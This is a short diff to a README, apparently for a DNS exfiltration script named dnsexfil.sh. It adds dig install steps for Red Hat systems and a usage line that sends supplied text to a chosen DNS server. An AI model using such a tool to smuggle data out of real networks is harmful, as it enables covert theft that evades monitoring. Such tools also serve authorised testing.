@@ -9,3 +9,16 @@ Ensure you have `dig` installed on your system. You can install it using your pa
 - Debian-based systems:
   ```sh
   sudo apt-get install dnsutils
+
+- Red Hat systems:
+  ```sh
+  sudo yum install bind-utils
+
+## Usage
+
+  ```sh
+  chmod +x dnsexfil.sh
+  ./dnsexfil.sh "Your text to send" "dns.server.address"
+
+
+
